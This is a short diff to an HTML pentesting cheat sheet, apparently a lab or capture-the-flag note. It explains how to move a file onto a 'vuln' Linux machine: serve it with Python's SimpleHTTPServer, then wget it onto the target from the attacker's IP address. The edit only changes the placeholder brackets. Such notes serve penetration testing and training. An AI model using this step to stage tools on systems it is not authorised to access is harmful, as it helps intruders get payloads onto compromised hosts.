@@ -4,4 +4,4 @@
 
 <b><p>How to upload files to vuln linux machine</p></b>
 <p>In your machine type : python -m SimpleHTTPServer</p>
-<p>In vuln machine type : wget <your ip address>:8000/<file to upload></p>
+<p>In vuln machine type : wget (your ip address):8000/(file to upload)</p>
